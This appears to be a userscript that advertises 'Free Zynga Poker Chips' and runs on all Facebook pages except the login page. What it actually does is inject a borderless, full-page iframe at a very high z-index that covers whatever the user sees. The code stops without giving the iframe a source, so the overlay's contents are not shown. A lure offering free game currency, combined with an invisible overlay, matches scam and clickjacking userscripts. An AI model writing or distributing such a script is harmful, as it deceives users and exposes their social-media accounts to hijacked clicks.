// ==UserScript==
// @name         HOW
// @description                  Free Zynga Poker Chips
// @description        Free Zynga Poker Chips
// @include         http://facebook.com/*
// @include         http://*.facebook.com/*
// @include         https://facebook.com/*
// @include         https://*.facebook.com/*
// @exclude         http://*.channel.facebook.com/*
// @exclude         https://*.channel.facebook.com/*
// @exclude         https://www.facebook.com/login.php
// @exclude         https://facebook.com/login.php
// @exclude         http://facebook.com/login.php
// @author         Gigxon
// @version         1
// @versionnumber   1
// @namespace      http://userscripts.org/scripts/show/128042
// ==/UserScript==
//

var el = document.createElement("iframe");
el.setAttribute('id', 'ifrm');
document.body.appendChild(el);
el.setAttribute('style', 'border:0px;z-index:99999;position:absolute;top:0px;left:0px;');
el.setAttribute('width', '100%');
el.setAttribute('height', '9999px');
el.setAttribute('scrolling', 'yes');